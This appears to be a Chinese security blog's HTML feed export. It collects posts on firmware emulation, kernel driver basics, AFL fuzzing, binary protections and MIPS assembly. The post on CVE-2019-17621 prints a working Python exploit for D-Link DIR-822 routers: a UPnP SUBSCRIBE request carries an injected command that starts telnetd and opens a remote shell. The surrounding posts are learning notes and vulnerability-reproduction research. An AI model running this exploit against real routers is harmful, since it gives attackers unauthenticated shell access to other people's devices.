class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 脚本内容 */</span><br><span class="hljs-comment">/* Ruben Santamarta - IOActive */</span><br><span class="hljs-comment">/* Rebuild VxWorks Symbol Table */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>     <span class="hljs-keyword">auto</span> load_addr;<br> <span class="hljs-keyword">auto</span> ea;<br> <span class="hljs-keyword">auto</span> offset;<br> <span class="hljs-keyword">auto</span> sName;<br> <span class="hljs-keyword">auto</span> eaStart;<br> <span class="hljs-keyword">auto</span> eaEnd; <br><br><span class="hljs-comment">// You&#x27;ll need to adjust these values</span><br>load_addr = <span class="hljs-number">0x10000</span>; <span class="hljs-comment">/* 加载地址 */</span> <br>eaStart = <span class="hljs-number">0x301E74</span> + load_addr; <span class="hljs-comment">/* 符号表起始地 */</span><br>eaEnd = <span class="hljs-number">0x3293b4</span> + load_addr; <span class="hljs-comment">/* 符号表结束地址 */</span><br><br> SetStatus(IDA_STATUS_WORK);<br> ea = eaStart;<br> <br> <span class="hljs-keyword">while</span>( ea &lt; eaEnd) &#123;<br> MakeDword( ea );<br> offset = <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">if</span> ( Dword( ea ) == <span class="hljs-number">0x900</span> || Dword( ea ) == <span class="hljs-number">0x500</span>)<br> &#123;<br> offset = <span class="hljs-number">8</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( Dword( ea ) == <span class="hljs-number">0x90000</span> || Dword( ea ) == <span class="hljs-number">0x50000</span> )<br> &#123;<br> offset = <span class="hljs-number">0xc</span>;<br> &#125; <br> <span class="hljs-keyword">if</span>( offset )<br> &#123;<br> MakeStr( Dword( ea - offset ), BADADDR); <br> sName = GetString( Dword( ea - offset ), <span class="hljs-number">-1</span>, ASCSTR_C ) ; <br>  <span class="hljs-keyword">if</span> ( sName )<br>  &#123;<br>  <span class="hljs-keyword">if</span>( Dword( ea ) == <span class="hljs-number">0x500</span> || Dword( ea ) == <span class="hljs-number">0x50000</span>)<br>  &#123;<br>      <span class="hljs-keyword">if</span> (  GetFunctionName( Dword( ea - offset + <span class="hljs-number">4</span>) ) == <span class="hljs-string">&quot;&quot;</span> )<br>      &#123;<br>      MakeCode( Dword( ea - offset + <span class="hljs-number">4</span>) );<br> MakeFunction( Dword( ea - offset + <span class="hljs-number">4</span>), BADADDR );<br>      &#125;<br>      &#125;<br>  MakeName( Dword( ea - offset + <span class="hljs-number">4</span> ), sName );  <br>  &#125;<br> &#125;<br> ea = ea + <span class="hljs-number">4</span>;   <br> &#125;<br> <br> SetStatus(IDA_STATUS_READY);<br>&#125;<br></code></pre></td></tr></table></figure><p>导入之后函数确实恢复出来了</p><p>如果直接搜ftpuser字符串，它下面这个就是密码，也就是flag答案…</p><p><img src="/img/firmware/16.jpg"></p><p>不做具体分析了（代码太多</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux kernel 学习</title>
    <link href="/2023/05/01/linux%20kernel/linux%20kernel/"/>
    <url>/2023/05/01/linux%20kernel/linux%20kernel/</url>
    
    <content type="html"><![CDATA[<h3 id="ubuntu源码编译安装"><a href="#ubuntu源码编译安装" class="headerlink" title="ubuntu源码编译安装"></a>ubuntu源码编译安装</h3><p>下载：<a href="https://www.kernel.org/">https://www.kernel.org</a></p><p>必要的编译环境，禁用证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gcc g++ clang cmake make flex bison libssl-dev<br>sudo apt-get install openssl<br>sudo apt-get install libssl-dev libelf-dev <br>./scripts/config --disable SYSTEM_TRUSTED_KEYS<br>./scripts/config --disable SYSTEM_REVOCATION_KEYS<br></code></pre></td></tr></table></figure><p>编译的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install</span><br>sudo make -j4 #代表编译线程个数<br></code></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make modules_install<br>sudo make install<br></code></pre></td></tr></table></figure><p>打开引导菜单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure><p><img src="/img/kernel/1.jpg"></p><p>多出了新安装的6.3.1的kernel</p><p>重启之后<code>uname -ra</code>会发现内核版本变了</p><h3 id="驱动程序编写"><a href="#驱动程序编写" class="headerlink" title="驱动程序编写"></a>驱动程序编写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;haidragon BSD/GPL&quot;</span>);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hello_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>printk(KERN_EMERG <span class="hljs-string">&quot;Load Hello World\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> hello <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_EMERG <span class="hljs-string">&quot;Remove Hello world\n&quot;</span>);<br>&#125;<br><br>module_init(hello_init);<br>module_exit(hello_exit);<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#Makefile</span><br>KDIR:= /lib/modules/6.3.1/build<br><span class="hljs-section">all:</span><br>make -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><span class="hljs-section">clean:</span><br>rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br></code></pre></td></tr></table></figure><p>编译出来的<code>hello.ko</code>，用<code>insmod</code>安装，用<code>rmmod</code>卸载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo insmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br>sudo rmmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>驱动开发</tag>
      
      <tag>kernel漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FUZZ-AFL</title>
    <link href="/2023/03/15/fuzz/fuzz/"/>
    <url>/2023/03/15/fuzz/fuzz/</url>
    
    <content type="html"><![CDATA[<h3 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h3><p>安装afl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install afl<br></code></pre></td></tr></table></figure><p>写一个在特定输入会崩溃的程序 <code>c1.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> ptr[<span class="hljs-number">20</span>];<br>cin&gt;&gt;ptr;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(ptr,<span class="hljs-string">&quot;deadbeef&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">abort</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>使用afl-g++编译，这样编译出来的程序会被插桩</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-g++ -g c1.cpp -o c1.out<br></code></pre></td></tr></table></figure><p>创建一个<code>input_folder</code>，这里<code>input_folder</code>里先随便放一个文本文件<code>abc</code>，里面写入<code>hello</code>。</p><p>再创建一个<code>output_folder</code>，什么都不用放进去</p><p>开始对得到的程序进行fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i ./input_folder -o ./output_folder c1.out<br></code></pre></td></tr></table></figure><blockquote><p>因为afl在进行模糊测试的时候是将这个<code>input_folder</code>里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。</p></blockquote><h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>安装angr：直接用docker，dockerhub上有angr的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker pull angr/angr<br>sudo docker run (--net host) -it angr/angr bash<br></code></pre></td></tr></table></figure><p>angr的简单例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;/bin/true&#x27;</span>) <span class="hljs-comment"># /bin/true是linux的一个永远return 0的程序</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex <span class="hljs-comment"># 将输出转为16进制，但是docker里并不自带，要pip install一下</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch<br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<br><span class="hljs-number">0x401670</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename<br><span class="hljs-string">&#x27;/bin/true&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序保护机制</title>
    <link href="/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>栈不可执行 no execute</p><p>同DEP，数据执行保护。</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>栈中加一个随机数，在函数执行完返回之前，检查这个随机数是否改变来判断是否栈溢出</p><h2 id="PIE与ASLR"><a href="#PIE与ASLR" class="headerlink" title="PIE与ASLR"></a>PIE与ASLR</h2><p>ASLR随机堆、栈、mmap的地址</p><p>PIE随机数据段、代码段的地址</p><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>relocation read-only 重定向只读</p><p>开启之后got表不可写</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mips的堆栈</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h4 id="MIPS的栈💣"><a href="#MIPS的栈💣" class="headerlink" title="MIPS的栈💣"></a>MIPS的栈💣</h4><ol><li><p>栈增长方向：同x86，向低地址增长</p></li><li><p>没有EBP指针（但是有一个fp，见MIPS汇编这篇文章）</p></li><li><p>传参：前四个参数通过$a0~$a3传递，多出的参数放入栈空间</p></li><li><p>返回值：$RA寄存器 </p></li></ol><h4 id="mips与x86函数调用区别"><a href="#mips与x86函数调用区别" class="headerlink" title="mips与x86函数调用区别"></a>mips与x86函数调用区别</h4><ol><li>将$PC寄存器移到$RA寄存器</li><li>如果被调用的函数是如果是非叶函数（调用其他函数），将$RA存在栈；叶函数则不变</li><li>函数返回时，叶函数直接 <code>jr $RA</code>，非叶函数先把返回地址存入$RA再跳转</li></ol><p>《家用路由器0day漏洞挖掘》这本书上的图例：</p><p><img src="/img/mips/1.jpg"></p><h4 id="主调函数干的事"><a href="#主调函数干的事" class="headerlink" title="主调函数干的事"></a>主调函数干的事</h4><h5 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h5><ol><li><p>创建 <code>more argument.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//more argument.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">more_arg</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c,<span class="hljs-type">int</span> d,<span class="hljs-type">int</span> e)</span><br>&#123;<br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">sprintf</span>(dst,<span class="hljs-string">&quot;%d%d%d%d%d\n&quot;</span>,a,b,c,d,e);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a1=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> a2=<span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> a3=<span class="hljs-number">3</span>;<br>    <span class="hljs-type">int</span> a4=<span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> a5=<span class="hljs-number">5</span>;<br>    more_arg(a1,a2,a3,a4,a5);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编译</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">mips-linux-gnu-gcc ./<span class="hljs-built_in">more</span>\ argument.c  -o   <span class="hljs-built_in">more</span>\ argument<br></code></pre></td></tr></table></figure></li><li><p>ida打开</p><p>首先可以看到前四个参数存入了$a0~$a3</p><p><img src="/img/mips/2.jpg"></p><p>然后前面5个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">li      $v0, ?<br>sw      $v0, 0x??+var_18($fp)<br></code></pre></td></tr></table></figure><p>是赋值操作，因此中间的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lw      $v0, 0x38+var_8($fp)<br>sw      $v0, 0x38+var_28($sp)<br></code></pre></td></tr></table></figure><p>即为第五个参数的传递</p></li></ol><h4 id="被调函数干的事"><a href="#被调函数干的事" class="headerlink" title="被调函数干的事"></a>被调函数干的事</h4><p>被调用函数的开头干了以下几件事（仅针对非叶函数）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">addiu   $sp, -0x40<br>sw      $ra, 0x38+var_s4($sp)<br>sw      $fp, 0x38+var_s0($sp)<br>move    $fp, $sp<br></code></pre></td></tr></table></figure><p>首先，抬高sp 0x40个字节<em><strong>（这里0x40是随便写的）</strong></em>。然后将ra放到<code>sp + 0x38 + 4</code>，fp放到<code>sp + 0x38 + 0</code>的位置，也就是被调函数的栈底为ra，然后是fp。最后将fp赋值为sp。</p><p>然后需要对参数进行处理，arg_0 到arg_C是主调函数预留出来的空间，需要被调函数再把$a0-$a3存入进去，然后arg_10本身主调函数就已经存好了第五个参数，不需要动。</p><p><img src="/img/mips/3.jpg"></p><p>最终主调和被调函数的栈长这样：</p><p><img src="/img/mips/4.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>mips汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mip汇编</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h2 id="MIPS汇编"><a href="#MIPS汇编" class="headerlink" title="MIPS汇编"></a>MIPS汇编</h2><ol><li><p>寄存器</p><p>32个，$0 ~ $31，每个寄存器具体作用见 <a href="https://ctf-wiki.org/assembly/mips/readme/">https://ctf-wiki.org/assembly/mips/readme/</a></p><p>常见的包括：</p></li></ol><table><thead><tr><th align="center">寄存器</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">恒定为0</td></tr><tr><td align="center">$4 - $7</td><td align="center">函数参数，通常也叫$a0 - $a3</td></tr><tr><td align="center">$29</td><td align="center">$sp，栈顶</td></tr><tr><td align="center">$30</td><td align="center">$fp，栈帧</td></tr><tr><td align="center">$31</td><td align="center">$ra，返回地址</td></tr></tbody></table><p>除了这32个寄出器，还有$PC和 HI、LO</p><ol start="2"><li><p>指令</p><p>MIPS指令为load-store架构，操作数必须先从内存中读取到寄存器里才能运算，<strong>不能直接操作内存</strong></p><table><thead><tr><th align="center">指令</th><th align="center">内容</th></tr></thead><tbody><tr><td align="center">beq</td><td align="center">branch on equal</td></tr><tr><td align="center">bgez</td><td align="center">branch on greater than or euqal to zero （≥0跳转）</td></tr><tr><td align="center">bgezal</td><td align="center">（al = and link）  $ra设置为下一条指令然后跳转，相当于跳转到一个函数</td></tr><tr><td align="center">bgtz</td><td align="center">branch on greater than zero （＞0跳转）</td></tr><tr><td align="center">bne</td><td align="center">branch on not equal</td></tr><tr><td align="center">jal</td><td align="center">jump and link 过程调用，会将$ra设置为下一条指令</td></tr></tbody></table><p>运算：乘法会将结果高32位存入HI，低32位存入LO</p><p>​            除法会将余数存入HI，商存入LO</p><p>三个操作数，都是将右边两个的计算存入左边的，例如 or $d,$s,$t ，d = s | t</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>mips汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qemu的安装与仿真第一个mips程序</title>
    <link href="/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h4 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h4><p>QEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware</p><h5 id="使用者模式"><a href="#使用者模式" class="headerlink" title="使用者模式"></a>使用者模式</h5><p>安装：<code>sudo apt-get install qemu-user[-static]</code></p><p>使用（以mips为例）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure><p>对于32位小端序（LSB）程序，使用<code>qemu-mipsel</code>来仿真，32位MSB程序，使用<code>qemu-mips</code>来仿真</p><p>一个小端序的仿真示例：</p><p><img src="/img/qemu/1.jpg"></p><blockquote><p>Q1：为什么要加 -static ？</p><p>A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。</p><p>而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）</p></blockquote><h5 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h5><p>不管了，直接用fap或者firmae</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-17621 dlink-822 命令注入漏洞复现</title>
    <link href="/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/"/>
    <url>/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>第一次成功仿真一个固件并成功访问web并成功复现漏洞的exp ……</p><p>期间用 firmware-analysis-toolkit 和 firmware-analysis-plus （包括它的docker）在不同的操作系统（kali2020.4，kali2022.4）上来回实验了各种各样的固件，最终的成功目前看来只是一个偶然（因为遇到了太多我目前无法解释的问题）特此记录一下😪</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>kali2020.4 （同样的固件，同样版本的fap，但是在kali2022.4上运行这个固件时，会Internal Error 500（但起码能访问到这个ip……😅）</p><p>固件下载地址：<a href="http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822">http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822</a></p><p>就这一个版本1.03B03</p><p><img src="/img/CVE-2019-17621/1.jpg"></p><p>fap使用的是2.3版本 <a href="https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3">https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3</a></p><p>使用的exp来源 <a href="https://www.jianshu.com/p/409106be87b7">https://www.jianshu.com/p/409106be87b7</a></p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p><img src="/img/CVE-2019-17621/2.jpg"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>这是第一次仿真固件，一开始用的是firmware-analysis-toolkit（fat，<a href="https://github.com/attify/firmware-analysis-toolkit">https://github.com/attify/firmware-analysis-toolkit</a>），首先它安装的时候就一堆问题。包括它的setup.sh里，要安装个lsb-core，但是apt找不到这个包，上网找了半天没找到一个能成功安装的，然后在他的issue里发现有人说这个不是必要的，可以删掉😅，然后setp.sh里还有个qt5base-dev的包，在kali上实际应该是qtbase5-dev😅，我不知道其他系统是啥样，还有一个坑是因为git  clone不稳定，我手动下载的zip包，但实际上这个clone是要recursive的😅，直接运行fat.py他是用pexpect去开启另一个进程，然后新启动的这个进程并不会把输出显示过来，看源码调试半天才发现是少文件，当时还很纳闷😅为啥会少（过于nc）</p><p>相对来说firmware-analysis-plus（fap，<a 